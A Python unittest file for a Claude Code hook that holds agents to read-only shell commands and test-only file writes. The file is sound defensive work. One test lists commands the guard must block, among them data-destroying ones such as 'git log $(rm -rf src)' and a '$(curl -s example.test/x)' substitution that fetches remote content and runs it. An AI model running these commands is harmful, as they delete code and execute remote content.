"""The read-only guard for agents that need a shell (handover-repo-analyst, health-analyst).

Story tests drive the hook the way Claude Code does: the PreToolUse event as JSON on stdin, exit 2 and a
reason on stderr to refuse. Production tests use the shapes a developer's machine produces: Windows paths,
`py -3`, a stripped environment.
"""
import json
import os
import subprocess
import sys
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
GUARD = os.path.join(HERE, "..", "..", ".claude", "hooks", "read-only-guard.py")
sys.path.insert(0, os.path.dirname(GUARD))
import importlib.util  # noqa: E402

spec = importlib.util.spec_from_file_location("guard", GUARD)
guard = importlib.util.module_from_spec(spec)
spec.loader.exec_module(guard)

SKILL = "/home/dev/.claude/skills/handover/scripts/extract_sessions.py"


def run_hook(command, policy="repo-reader", env=None):
    event = {"hook_event_name": "PreToolUse", "tool_name": "Bash", "agent_type": "handover-repo-analyst",
             "tool_input": {"command": command}}
    return subprocess.run([sys.executable, GUARD, policy], input=json.dumps(event), capture_output=True,
                          text=True, env=env)


def allowed(command, policy="repo-reader"):
    try:
        guard.check(command, policy)
        return True
    except guard.Refused:
        return False


class Stories(unittest.TestCase):
    def test_story_the_handover_analyst_reads_a_repo_and_is_stopped_at_commit(self):
        # Given the analyst's own steps from the handover instructions
        default = ("DEFAULT=$(git -C \"$REPO\" symbolic-ref refs/remotes/origin/HEAD 2>/dev/null | "
                   "sed 's@^refs/remotes/origin/@@')")
        steps = [
            default,
            "[ -z \"$DEFAULT\" ] && DEFAULT=$(git -C \"$REPO\" branch -l master main | head -1 | tr -d '* ')",
            "git -C \"$REPO\" branch --no-merged \"$DEFAULT\" --format='%(refname:short)|%(committerdate:short)'",
            "git -C \"$REPO\" log --since=2026-11-01 --format='%h %s' | head -50",
            "git -C \"$REPO\" diff --stat main...HEAD",
            "git -C \"$REPO\" config --get remote.origin.url",
            f"python \"{SKILL}\" --repo \"$REPO\" --since 2026-11-01",
            "ls \"$HOME/.claude/sessions\"/checkpoint-*.md",
        ]
        # When each runs through the hook, then each is allowed
        for step in steps:
            result = run_hook(step)
            self.assertEqual(0, result.returncode, f"{step}\n{result.stderr}")
        # And when the analyst tries to commit what it found, it is refused with a reason it can read
        result = run_hook("git -C \"$REPO\" add -A && git -C \"$REPO\" commit -m handover")
        self.assertEqual(2, result.returncode)
        self.assertIn("read-only agent: refused (git add is not a read command)", result.stderr)

    def test_story_the_health_check_writes_its_report_card_and_nothing_else(self):
        # Given the health-check's measurements, which write into coverage/
        for step in ["dotnet test --collect:\"XPlat Code Coverage\" --results-directory ./coverage",
                     "dotnet build -warnaserror- /clp:Summary 2>&1 | tee ./coverage/build.log",
                     "dotnet list package --vulnerable --include-transitive",
                     "echo '{\"grade\":\"B\"}' >> ./coverage/health-history.json"]:
            self.assertTrue(allowed(step, "health"), step)
        # When it would write a source file, it is refused
        self.assertFalse(allowed("echo x > src/Program.cs", "health"))
        self.assertFalse(allowed("dotnet format", "health"))
        # And the handover analyst gets none of the health writes
        self.assertFalse(allowed("echo x >> ./coverage/health-history.json"))
        self.assertFalse(allowed("dotnet build"))

    def test_story_a_write_hidden_inside_a_read_is_still_found(self):
        hidden = [
            "git log $(rm -rf src)",
            "cat README.md `touch x`",
            "find . -name '*.cs' -exec rm {} \\;",
            "find . -name '*.tmp' -delete",
            "sed -i 's/a/b/' src/a.cs",
            "sed 's/a/b/w out.txt' src/a.cs",
            "grep -r TODO . > todo.txt",
            "git log --output=log.txt",
            "git -c core.pager=sh log",
            "bash -c 'git log'",
            "python -c 'open(\"x\",\"w\")'",
            "xargs rm < files.txt",
            "git branch new-branch",
            "git branch -D old",
            "git tag v1",
            "git config user.name x",
            "git symbolic-ref HEAD refs/heads/x",
            "git stash",
            "git checkout -- src/a.cs",
            "python ../../tmp/evil/scripts/x.py",
            "$(curl -s example.test/x)",
        ]
        for command in hidden:
            self.assertFalse(allowed(command), command)

    def test_reads_that_look_like_writes_are_allowed(self):
        for command in ["grep -n 'x > y' src/a.cs", "git log --format='%h > %s'", "cat a.txt 2>/dev/null",
                        "git status --short 2>&1 | head", "echo done >/dev/null",
                        "for f in docs/*.md; do head -3 \"$f\"; done", "git branch -a", "git tag --list 'v*'",
                        "git stash list", "git worktree list", "git remote -v", "command -v dotnet"]:
            self.assertTrue(allowed(command), command)

    def test_a_command_that_cannot_be_parsed_is_refused(self):
        self.assertFalse(allowed("cat 'unterminated"))
        self.assertFalse(allowed("cat <<EOF\nhello\nEOF"))


def tool_hook(tool, path, policy="qa", cwd="/repo"):
    event = {"hook_event_name": "PreToolUse", "tool_name": tool, "agent_type": "qa-engineer", "cwd": cwd,
             "tool_input": {"file_path": path, "content": "x"}}
    return subprocess.run([sys.executable, GUARD, policy], input=json.dumps(event), capture_output=True, text=True)


class QaEngineer(unittest.TestCase):
    def test_story_the_adversary_writes_its_abuse_cases_and_their_tests_but_not_the_fix(self):
        # Given the adversary working beside the QA engineer on the same story
        for path in ["/repo/tests/Clinic.Tests/story.md", "/repo/tests/Clinic.Tests/abuse.md",
                     "/repo/tests/Clinic.Tests/Booking/BookingAbuseTests.cs"]:
            self.assertEqual(0, tool_hook("Write", path).returncode, path)
        # When it would patch the hole it found, then it is refused: the fix is the implementer's
        self.assertEqual(2, tool_hook("Edit", "/repo/src/Clinic/Booking/BookingEndpoints.cs").returncode)
        self.assertEqual(2, tool_hook("Write", "/repo/src/Clinic/abuse.md.cs").returncode)

    def test_story_the_qa_engineer_writes_the_tests_and_the_story_but_not_the_code(self):
        # Given the QA engineer designing a booking story's tests
        for path in ["/repo/tests/Clinic.Tests/Booking/BookingTests.cs", "/repo/src/Clinic.Tests/story.md",
                     "/repo/Clinic.IntegrationTests/BookingApiTests.cs", "/repo/docs/booking/story.md"]:
            # When it writes a test or the story, then it is allowed
            self.assertEqual(0, tool_hook("Write", path).returncode, path)
        # When it would write the code the tests are for, then it is refused, with who writes it
        result = tool_hook("Edit", "/repo/src/Clinic/Booking/BookingPolicy.cs")
        self.assertEqual(2, result.returncode)
        self.assertIn("this agent writes only tests, story.md and abuse.md", result.stderr)
        # And a path that climbs out of the test project is refused too
        self.assertEqual(2, tool_hook("Write", "/repo/tests/Clinic.Tests/../../src/Clinic/Booking.cs").returncode)

    def test_the_qa_engineer_runs_the_tests_but_writes_code_with_no_shell_trick(self):
        for command in ["dotnet test tests/Clinic.Tests --filter \"FullyQualifiedName~Booking\"",
                        "dotnet build", f"python \"{SKILL}\""]:
            self.assertTrue(allowed(command, "qa"), command)
        self.assertFalse(allowed("echo 'class X {}' > src/Clinic/X.cs", "qa"))
        self.assertFalse(allowed("cp tests/Clinic.Tests/Fake.cs src/Clinic/Fake.cs", "qa"))
        self.assertTrue(allowed("dotnet test 2>&1 | tee tests/Clinic.Tests/red.log", "qa"))

    def test_story_a_repo_cloned_under_a_folder_named_tests_is_still_guarded(self):
        # Given the service is cloned to /home/dev/tests/clinic
        cwd = "/home/dev/tests/clinic"
        # Then its production code is still refused, and its test project still allowed
        self.assertEqual(2, tool_hook("Write", f"{cwd}/src/Clinic/Booking.cs", cwd=cwd).returncode)
        self.assertEqual(0, tool_hook("Write", f"{cwd}/tests/Clinic.Tests/BookingTests.cs", cwd=cwd).returncode)
        # And a file outside the working folder is refused, whatever its folders are called
        self.assertEqual(2, tool_hook("Write", "/home/dev/other.Tests/x.cs", cwd=cwd).returncode)

    def test_other_agents_never_get_the_write_tools(self):
        self.assertEqual(2, tool_hook("Write", "/repo/tests/Clinic.Tests/A.cs", "repo-reader").returncode)

    def test_windows_paths(self):
        cwd = r"C:\src\visits"
        self.assertEqual(0, tool_hook("Write", r"C:\src\visits\tests\Visits.Tests\BookingTests.cs", cwd=cwd).returncode)
        self.assertEqual(2, tool_hook("Write", r"C:\src\visits\src\Visits\Booking.cs", cwd=cwd).returncode)
        # Windows paths ignore case: the drive and folders may come back in another case
        self.assertEqual(0, tool_hook("Write", r"c:\SRC\visits\tests\Visits.Tests\A.cs", cwd=cwd).returncode)


class Production(unittest.TestCase):
    def test_windows_paths_and_the_py_launcher(self):
        script = r"C:\Users\dev\.claude\skills\handover\scripts\extract_sessions.py"
        self.assertTrue(allowed(f'py -3 "{script}" --repo "C:\\src\\visits" --since 2026-11-01'))
        self.assertTrue(allowed(f'python.exe "{script}"'))
        self.assertTrue(allowed(r'git -C "C:\src\visits" log -5', "repo-reader"))
        self.assertTrue(allowed(r'dotnet build 2>&1 | tee "coverage\build.log"', "health"))
        # Unquoted, the shell reads the backslash as an escape and writes coveragebuild.log, outside coverage/
        self.assertFalse(allowed(r'dotnet build 2>&1 | tee coverage\build.log', "health"))
        self.assertFalse(allowed(r'echo x > C:\src\visits\Program.cs', "health"))

    def test_the_hook_runs_with_a_bare_environment_and_refuses_bad_input(self):
        bare = {"PATH": os.environ.get("PATH", ""), "LC_ALL": "C"}
        self.assertEqual(0, run_hook("git status", env=bare).returncode)
        result = subprocess.run([sys.executable, GUARD, "repo-reader"], input="not json", capture_output=True,
                                text=True, env=bare)
        self.assertEqual(2, result.returncode)

    def test_other_tools_pass_through(self):
        event = {"hook_event_name": "PreToolUse", "tool_name": "Read", "tool_input": {"file_path": "a"}}
        result = subprocess.run([sys.executable, GUARD, "repo-reader"], input=json.dumps(event),
                                capture_output=True, text=True)
        self.assertEqual(0, result.returncode)


class Installed(unittest.TestCase):
    """The hook as the layer installs it: the agent's frontmatter command, run by a shell with that HOME."""

    def test_story_the_installed_agents_hook_starts_and_refuses_a_write(self):
        import re
        import shutil
        import tempfile
        bash = shutil.which("bash")
        if not bash:
            self.skipTest("no bash on this machine")
        repo = os.path.abspath(os.path.join(HERE, "..", ".."))
        home = tempfile.mkdtemp(prefix="guard home ")
        try:
            claude = os.path.join(home, ".claude")
            subprocess.run([sys.executable, os.path.join(repo, "tools", "layer.py"), "--claude-dir", claude,
                            "install", os.path.join(repo, ".claude")], check=True, capture_output=True)
            for agent, write in (("handover-repo-analyst", "git commit -m x"), ("health-analyst", "touch src/a.cs"),
                                 ("qa-engineer", "touch src/a.cs"), ("adversary", "touch src/a.cs")):
                text = open(os.path.join(claude, "agents", f"{agent}.md"), encoding="utf-8").read()
                command = re.search(r'command: "(.*read-only-guard\.py [a-z-]+)"', text).group(1)
                self.assertNotIn("{", command)
                env = dict(os.environ, HOME=home.replace("\\", "/"))
                event = lambda c: json.dumps({"tool_name": "Bash", "tool_input": {"command": c}})
                ok = subprocess.run([bash, "-c", command], input=event("git log -3"), capture_output=True, text=True, env=env)
                self.assertEqual(0, ok.returncode, ok.stderr)
                refused = subprocess.run([bash, "-c", command], input=event(write), capture_output=True, text=True, env=env)
                self.assertEqual(2, refused.returncode, f"{agent}: {refused.stderr}")
                self.assertIn("read-only agent: refused", refused.stderr)
        finally:
            shutil.rmtree(home, ignore_errors=True)


if __name__ == "__main__":
    unittest.main()
